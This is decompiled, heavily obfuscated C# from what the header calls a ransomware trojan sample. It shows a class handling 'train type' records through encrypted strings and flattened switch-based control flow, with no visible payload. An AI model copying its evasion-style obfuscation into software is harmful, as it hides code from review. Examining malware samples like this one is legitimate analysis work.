// Decompiled with JetBrains decompiler
// Type: Es7.Kz4
// Assembly: y2KB, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3A6517FF-F8AF-40F3-AD9D-058B976B3962
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.10-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-75f615f27b23cc56767ed8b3e684d69b27376165432116913f30cbc12c439fb2.exe

using a8S6;
using a9X0;
using Bo4;
using c3W;
using d5F;
using Fc48;
using j5X;
using Microsoft.VisualBasic;
using q1E;
using q6Y;
using s7J;
using System;
using System.Collections;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Security;
using System.Windows.Forms;
using Tb7;
using w0K3;
using x9N;
using Xe6;
using Zy7;

namespace Es7
{
  public class Kz4
  {
    private r3MF.p9KY s;

    public Collection TrainTypes => this.s.r;

    public Kz4() => this.s.r = new Collection();

    public void Hz1(string Cb1)
    {
      byte[] t = Gr0.t;
      ISerializable serializable = (ISerializable) Gr0.b3D(Cb1).g6Y(Bj91.g8RX((byte) 21, 898836778, 6, 'U'));
      object obj1;
      try
      {
        int num = 3;
        object current;
        object obj2;
        while (true)
        {
          switch (num)
          {
            case 0:
              (obj2 as Pq7).MaxCapacity = m4G.k5Z<object>(k4YJ.Kt3z<object>(To0.x8G<Collection>((Collection) current, 3, 509, 404), 'Ź', (short) 312), 498, 409);
              num = 2;
              continue;
            case 1:
            case 6:
              (obj2 as Pq7).TypeDescriptor = w9R.Nc9<object>(To0.x8G<Collection>((Collection) current, 2, 781, 868), '˫', 729);
              num = 0;
              continue;
            case 2:
              this.TrainTypes.Add((object) (Pq7) obj2, (string) null, (object) null, (object) null);
              num = 7;
              continue;
            case 4:
              current = (object) (Collection) (obj1 as IEnumerator).Current;
              obj2 = (object) new Pq7(Bj91.s2C8<string>(w9R.Nc9<object>(To0.x8G<Collection>((Collection) current, 1, 242, 155), 'Ĺ', 266), 140, (short) 153));
              num = 1;
              continue;
            case 5:
            case 7:
              num = ((IEnumerator) obj1).MoveNext() ? (int) t[139] - 138 : 9;
              continue;
            case 9:
              goto label_17;
            case 10:
              num = 7;
              continue;
            default:
              obj1 = (object) s7F.Dr9<Collection>((Collection) serializable, 'Ņ', (short) 374);
              goto case 10;
          }
        }
      }
      finally
      {
        int num = 0;
        while (true)
        {
          switch (num)
          {
            case 1:
              num = 2;
              continue;
            case 2:
            case 3:
              goto label_16;
            case 6:
              ((IEnumerator) obj1 as IDisposable).Dispose();
              goto case 1;
            default:
              num = !(obj1 as IEnumerator is IDisposable) ? 2 : 6;
              continue;
          }
        }
label_16:;
      }
label_17:
      switch (4)
      {
      }
    }

    public void Fj1(ref Pq7 Gg3)
    {
      byte[] t = Gr0.t;
      IDeserializationCallback deserializationCallback = (IDeserializationCallback) Gr0.c4H().g6Y(Ys73.r4YZ<string, string, string>(Bj91.g8RX((byte) 0, 898836831, 3, 'ô'), s7F.Rd7(Gg3.TypeID, 688, (short) 675), Bj91.g8RX((byte) 12, 898835069, 4, 'L'), 'ù', 187));
      object obj;
      try
      {
        int num = 7;
        object current;
        bool flag;
        while (true)
        {
          switch (num)
          {
            case 0:
              num = 5;
              continue;
            case 1:
              num = 5;
              continue;
            case 2:
              current = (object) (Collection) (obj as IEnumerator).Current;
              Gg3.TypeDescriptor = w9R.Nc9<object>(To0.x8G<Collection>((Collection) current, 2, 133, 236), '\u0099', 171);
              num = (int) t[14] - 235;
              continue;
            case 4:
              num = flag ? 2 : 8;
              continue;
            case 5:
            case 6:
              flag = ((IEnumerator) obj).MoveNext();
              goto case 4;
            case 8:
              goto label_16;
            case 9:
              Gg3.MaxCapacity = Convert.ToDouble(k4YJ.Kt3z<object>(To0.x8G<Collection>((Collection) current, 3, 308, 349), '˥', (short) 676));
              num = 0;
              continue;
            default:
              obj = (object) s7F.Dr9<Collection>((Collection) deserializationCallback, 'Ų', (short) 321);
              goto case 1;
          }
        }
      }
      finally
      {
        int num = 4;
        while (true)
        {
          switch (num)
          {
            case 1:
            case 6:
              goto label_15;
            case 2:
              (obj as IEnumerator as IDisposable).Dispose();
              num = 1;
              continue;
            default:
              num = !((IEnumerator) obj is IDisposable) ? 1 : 2;
              continue;
          }
        }
label_15:;
      }
label_16:
      switch (0)
      {
      }
    }

    public int Xs2(Pq7 Mw4)
    {
      int num1 = 0;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 1:
          case 4:
            num1 = 2;
            continue;
          case 2:
          case 3:
            goto label_4;
          default:
            num2 = Gr0.c4H().Xf5(Bj91.g8RX((byte) 10, 898836620, 6, 'ü') + s7F.Rd7(Mw4.TypeID, 254, (short) 237) + Bj91.g8RX((byte) 22, 898837909, 8, '\u0014') + Mw4.TypeDescriptor + Bj91.g8RX((byte) 25, 898837724, 1, 'â') + Ys73.g4AS(Mw4.MaxCapacity, (short) 123, 0) + Bj91.g8RX((byte) 26, 898835132, 2, '©'));
            goto case 1;
        }
      }
label_4:
      int num3 = num2;
      Gr0.t[135] = (byte) (((int) Gr0.t[135] ^ (int) Gr0.t[189]) & 71);
      return num3;
    }

    public int f1Z(Pq7 Lf4)
    {
      int num1 = 1;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = 2;
            continue;
          case 2:
            goto label_4;
          default:
            num2 = Gr0.c4H().Xf5(Bj91.g8RX((byte) 25, 898836648, 4, 'Ì') + Lf4.TypeDescriptor + Bj91.g8RX((byte) 28, 898836698, 5, '\a') + Ys73.g4AS(Lf4.MaxCapacity, (short) 77, 54) + Bj91.g8RX((byte) 19, 898836704, 0, 'ú') + s7F.Rd7(Lf4.TypeID, 372, (short) 359) + Bj91.g8RX((byte) 1, 898835069, 4, 'Ö'));
            goto case 0;
        }
      }
label_4:
      return num2;
    }

    public int Df4(Pq7 Ln0)
    {
      int num1 = 4;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            goto label_4;
          case 2:
            num1 = 1;
            continue;
          default:
            num2 = Gr0.c4H().Xf5(Ys73.r4YZ<string, string, string>(Bj91.g8RX((byte) 31, 898836727, 1, '\u0095'), s7F.Rd7(Ln0.TypeID, 934, (short) 949), Bj91.g8RX((byte) 12, 898835070, 7, '6'), 'g', 37));
            goto case 2;
        }
      }
label_4:
      return num2;
    }

    internal static void n4Q()
    {
      int num = 5;
      Array Cj5;
      IEnumerable enumerable;
      ICloneable cloneable;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            num = 4;
            continue;
          case 1:
            enumerable = (IEnumerable) e8W.Ar5((string[]) Cj5, 0, 3);
            cloneable = (ICloneable) e8W.Ar5((string[]) Cj5, 4, 7);
            goto case 3;
          case 3:
            num = 6;
            continue;
          case 4:
            goto label_7;
          case 6:
            k4YJ.mDic.Add(k4YJ.tName, (object) (string) enumerable);
            k4YJ.mDic.Add(k4YJ.mName, (object) (string) cloneable);
            goto case 0;
          default:
            Cj5 = (Array) new string[8]
            {
              Bj91.g8RX((byte) 15, 898836514, 0, '\u0087'),
              Bj91.g8RX((byte) 16, 898836516, 2, '\u0013'),
              Bj91.g8RX((byte) 28, 898836537, 3, 'ú'),
              Bj91.g8RX((byte) 22, 898836539, 5, 'à'),
              Bj91.g8RX((byte) 20, 898836516, 6, '\u0017'),
              Bj91.g8RX((byte) 7, 898836529, 3, 'Ú'),
              Bj91.g8RX((byte) 24, 898836542, 4, '"'),
              Bj91.g8RX((byte) 15, 898836534, 8, 'Ê')
            };
            num = 1;
            continue;
        }
      }
label_7:;
    }

    [SecuritySafeCritical]
    internal static Exception x8Q<j5L>([In] j5L obj0, [In] char obj1, [In] short obj2) where j5L : Exception
    {
label_3:
      int num1 = 0;
      int num2 = 10;
      ISerializable serializable;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
          case 5:
          case 8:
            serializable = (ISerializable) obj0.InnerException;
            num2 = 2;
            continue;
          case 1:
            goto label_3;
          case 2:
            ++num1;
            num2 = 1052 > 526 - 450 * 2 ? 11 : 7;
            continue;
          case 3:
            serializable = (ISerializable) null;
            num2 = 2;
            continue;
          case 7:
            num2 = 10;
            continue;
          case 9:
            num2 = 10;
            continue;
          case 10:
            int num3;
            switch (((int) obj1 ^ (int) obj2) - 59 ^ num1)
            {
              case 0:
                num3 = 0;
                break;
              default:
                num3 = 3;
                break;
            }
            num2 = num3;
            continue;
          case 11:
            goto label_12;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Kz4.x8Q);
            num2 = 1;
            continue;
        }
      }
label_12:
      return serializable as Exception;
    }

    [SecuritySafeCritical]
    internal static void Lj9<e8D>([In] e8D obj0, [In] bool obj1, [In] short obj2, [In] int obj3) where e8D : ButtonBase
    {
      int num1 = 5;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_11;
          case 1:
            num1 = 898 < 3592 / 4 - 55 ? 7 : 0;
            continue;
          case 2:
          case 6:
            num1 = 3;
            continue;
          case 3:
            ++num2;
            goto case 1;
          case 4:
            goto label_12;
          case 7:
            int num3;
            switch ((obj3 ^ (int) obj2) - 37 ^ num2)
            {
              case 0:
                num3 = 8;
                break;
              default:
                num3 = 6;
                break;
            }
            num1 = num3;
            continue;
          case 8:
            obj0.UseVisualStyleBackColor = obj1;
            goto case 3;
          default:
            num2 = 0;
            num1 = 7;
            continue;
        }
      }
label_11:
      return;
label_12:;
    }

    [SecuritySafeCritical]
    internal static MouseButtons Gs2<Pn9>([In] Pn9 obj0, [In] char obj1, [In] int obj2) where Pn9 : MouseEventArgs
    {
label_3:
      int num1 = 0;
      int num2 = 2;
      MouseButtons mouseButtons;
      int num3;
      int num4;
      while (true)
      {
        switch (num2)
        {
          case 0:
            int num5 = num3 / 3;
            int num6 = num4;
            Jz9.P[49] = (char) ((int) Jz9.P[49] - obj2 & 158);
            num2 = 160 < num5 - num6 ? 2 : 6;
            continue;
          case 1:
          case 9:
            ++num1;
            num3 = 480;
            num4 = 68;
            goto case 0;
          case 2:
            int num7;
            switch (((int) obj1 ^ obj2) - 105 ^ num1)
            {
              case 0:
                num7 = 8;
                break;
              default:
                num7 = 7;
                break;
            }
            num2 = num7;
            continue;
          case 3:
          case 10:
            goto label_3;
          case 5:
            num2 = 2;
            continue;
          case 6:
            goto label_12;
          case 7:
            mouseButtons = MouseButtons.None;
            num2 = 1;
            continue;
          case 8:
            mouseButtons = obj0.Button;
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Kz4.Gs2);
            num2 = 10;
            continue;
        }
      }
label_12:
      return mouseButtons;
    }

    internal sealed class t6X
    {
      internal TextBox Y;
      internal TextBox Q;
      internal TextBox J;
      internal Button F;
      internal TextBox R;
      internal ListBox x;
      internal ListBox d;
      internal Button N;
      internal Label s;
      internal Button h;
      internal Label a;
      internal Dc9 p;
      internal Pq7 b;
      internal Mz9 I;
      internal int E;

      internal t6X()
      {
      }
    }

    internal sealed class t6K
    {
      internal DateTime H;

      internal t6K()
      {
      }
    }

    internal sealed class s0G
    {
      internal IContainer f;
      internal Label h;
      internal Label N;
      internal Label Y;
      internal Label D;
      internal Label l;
      internal Button B;
      internal Button c;
      internal Label Q;
      internal k8F G;
      internal int J;
      internal int u;
      internal Point W;

      internal s0G()
      {
      }
    }
  }
}
